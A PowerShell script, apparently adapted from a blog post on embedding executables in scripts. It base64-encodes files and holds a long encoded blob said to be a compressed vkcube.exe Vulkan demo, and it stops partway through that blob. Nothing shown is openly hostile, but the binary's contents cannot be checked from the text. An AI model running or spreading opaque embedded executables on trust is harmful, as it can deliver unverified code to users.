function func_embed-exe-in-psscript2
{
#https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts/

#Adapted a few lines so that it runs in PowerShell Core, search for lines that start with comment "ADAPTED TO PS7"

#Only works for 64-bit executables as only 64-bit pwsh.exe is installed....

#usage: wine powershell -f embedding-exe-files-into-powershell-scripts-example_vkcube.exe.ps1



function Convert-BinaryToString {
 
   [CmdletBinding()] param (
 
      [string] $FilePath
 
   )
 
   try {
 
      $ByteArray = [System.IO.File]::ReadAllBytes($FilePath);
 
   }
 
   catch {
 
      throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct.";
 
   }
 
   if ($ByteArray) {
 
      $Base64String = [System.Convert]::ToBase64String($ByteArray);
 
   }
 
   else {
 
      throw '$ByteArray is $null.';
 
   }
 
   Write-Output -InputObject $Base64String;
 
}
 # Below vkcube.exe as a Base64 encoded string; Included copyright below:
 # compiled for smaller size (after choco install mingw and choco install vulkan-sdk) with gcc -s -Os -fno-ident -fno-stack-protector -fomit-frame-pointer -fno-unwind-tables -fno-asynchronous-unwind-tables -falign-functions=1  -mpreferred-stack-boundary=4 -falign-jumps=1 -falign-loops=1 -I"..\Include"  .\cube.c "..\Lib\vulkan-1.lib" -lgdi32
 # and added two extra lines to cube.c : #define VK_USE_PLATFORM_WIN32_KHR and #define NDEBUG
 # Copyright (c) 2015-2019 The Khronos Group Inc.
 # Copyright (c) 2015-2019 Valve Corporation
 # Copyright (c) 2015-2019 LunarG, Inc.
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
 # you may not use this file except in compliance with the License.
 # You may obtain a copy of the License at
 #
 #     http://www.apache.org/licenses/LICENSE-2.0
 #
 # Unless required by applicable law or agreed to in writing, software
 # distributed under the License is distributed on an "AS IS" BASIS,
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
 #
 # Author: Jeremy Hayes <jeremy@lunarg.com>
 # Author: Charles Giessen <charles@lunarg.com>


#Compress Base64-string:

#$InputString='any uncompressed base64 string...'

#Compress Base64-string:

#$MemoryStream = [System.IO.MemoryStream]::new()
#$Compressor = [System.IO.Compression.GZipStream]::new($MemoryStream,[System.IO.Compression.CompressionMode]::Compress,3)
#$CompressionWriter = [System.IO.StreamWriter]::new($Compressor)
#$CompressionWriter.Write($InputString)
#$CompressionWriter.Close()

#[System.Convert]::ToBase64String($MemoryStream.ToArray())

# format later with unix fold for nicer output (120 char. width)

#this is a vkcube.exe file regulary compressed with 7z on commandline
$CompressedString ='
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
